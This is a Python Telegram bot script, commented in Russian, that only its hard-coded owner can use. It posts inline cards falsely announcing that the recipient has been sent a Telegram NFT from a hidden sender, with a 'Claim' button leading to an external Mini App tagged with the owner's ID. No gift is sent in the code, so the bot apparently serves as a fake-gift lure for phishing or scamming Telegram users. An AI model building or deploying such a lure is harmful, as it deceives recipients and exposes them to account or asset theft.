import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent, WebAppInfo, InlineQueryResultGif, InlineQueryResultMpeg4Gif
from telegram.ext import Application, CommandHandler, ContextTypes, InlineQueryHandler
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MINI_APP_URL = os.getenv("MINI_APP_URL", "https://yourdomain.com")
BOT_USERNAME = os.getenv("BOT_USERNAME", "IncognitoGiftsBot")
APP_SHORT_NAME = os.getenv("APP_SHORT_NAME", "incognitogifts")

# ID владельца бота (только он может использовать inline режим)
OWNER_USER_ID = 8494675902

if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN не установлен в переменных окружения")

async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обрабатывает inline запросы - показывает красивую карточку с видео (высокое качество)"""
    user_id = update.inline_query.from_user.id

    # Проверка доступа: только владелец может использовать бота
    if user_id != OWNER_USER_ID:
        logger.warning(f"Попытка доступа от неавторизованного пользователя: {user_id}")
        await update.inline_query.answer([], cache_time=1)
        return

    # Ссылка на Mini App
    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"

    nft_name = "Lol Pop #130400"
    video_url = "https://www.image2url.com/r2/default/videos/1786960676045-7ceade89-2395-41a1-8019-e7f1890a0003.mp4"
    thumbnail = "https://i.imgur.com/placeholder.jpg"

    # Создаём красивую карточку с кнопкой
    keyboard = [
        [InlineKeyboardButton("Забрать", url=mini_app_link)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Используем InlineQueryResultMpeg4Gif для лучшего качества
    results = [
        InlineQueryResultMpeg4Gif(
            id="nft_gift",
            mpeg4_url=video_url,
            thumbnail_url=thumbnail,
            mpeg4_width=480,
            mpeg4_height=738,
            title="Отправить Telegram NFT",
            caption=f"Вам отправлен Telegram NFT: **{nft_name}**\n\nОтправитель: Аккаунт скрыт",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    ]

    await update.inline_query.answer(results, cache_time=1)

def main():
    logger.info("Запуск бота...")

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(InlineQueryHandler(inline_query))

    logger.info("Бот запущен и готов к работе!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
